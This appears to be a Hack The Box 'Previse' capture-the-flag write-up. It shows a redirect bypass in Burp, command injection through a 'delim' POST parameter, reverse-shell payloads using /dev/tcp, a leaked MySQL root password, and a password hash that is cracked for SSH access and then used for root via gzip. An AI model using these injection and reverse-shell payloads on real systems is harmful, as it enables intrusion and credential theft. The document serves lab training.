![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/previse%20logo.png)


## nmap all ports
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/nmap%20all%20ports.png)

## nmap services + versions
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/nmap%20services%20and%20versions.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/apache%20release%20date.png)

## gobuster
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/gobuster%20main%20redirects.png)
normally redirects have a size of 0 
but here redirects hava a size > 0
intercept redirects with burpsuite

## domain
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/main%20domain%20redirect%20to%20login.php.png)

## burpsuite
### request
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/burpsuite%20request%20redirect.png)

### response
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/burpsuite%20intercept%20response%20redirect.png)

### response change status code to 200 OK and forward
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/burpsuite%20change%20status%20code.png)

### new domain with login bypassed but immediately redirect to login.php
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/login%20dashboard.png)

### lets make an account --> turn intercept of
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/create%20account.png)

### login
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/login%20to%20new%20account.png)

### login dashboard
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/login%20dashboard%201.png)

### login files
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/login%20files.png)

### dowload SITEBACKUP.ZIP and inspect user input

````
grep '$_' * | grep -v "SESSION\|SERVER"

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/server%20backup%20user%20input%20exec.png)

### python scripts executes post command with parameter delim
````
logs.php:$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");

`````

### also parameter delim
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/burpsuite%20command%20execution.png)

### add sleep command --> response is waiting for 5 seconds
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/burpsuite%20command%20execution%20sleep.png)

### create reverse shell
post data
```
delim=comma;bash -c 'bash -i >& /dev/tcp/10.10.14.11/1111 0>&1'

//url encoded

delim=comma;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.11/1111+0>%261'

```

### get shell as www-data
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/burpsuite%20get%20reverse%20shell.png)

### always look first in config files on servers
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/config%20file%20reveals%20password%20mysql.png)

````mysql

root:mySQL_P@ssw0rd!:)


`````

### connect to mysql
````
mysql -u root -p


`````

### mysql
````
show databases;

use previse;

show tables;

select * from accounts;

select * from accounts where id = 1;

select TO_BASE64(password) from accounts where id = 1;



`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/mysql%20extract%20info.png)

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/mysql%20get%20password.png)

### password hash to base64 because of special charaters in password
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/mysql%20convert%20to%20base64.png)
````
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.

JDEk8J+ngmxsb2wkRFFwbWR2bmI3RWV1TzZVYXFSSXRmLg==

`````

### hashcat
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/hashcat.png)
````
m4lwhere:ilovecody112235!

`````

### ssh with new creds
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/ssh%20m4lwhere.png)

### user.txt
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/user.txt.png)

### root.txt error stdout not printing
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/root.txt.png)

### gzip reverse shell
````bash

bash -i >& /dev/tcp/10.10.14.1111/1111 0>&1

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/root%20reverse%20shell%20gzip.png)

### root shell working
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Previse/screenshots/root%20shell%20working.png)
XXXXXXXXXXXX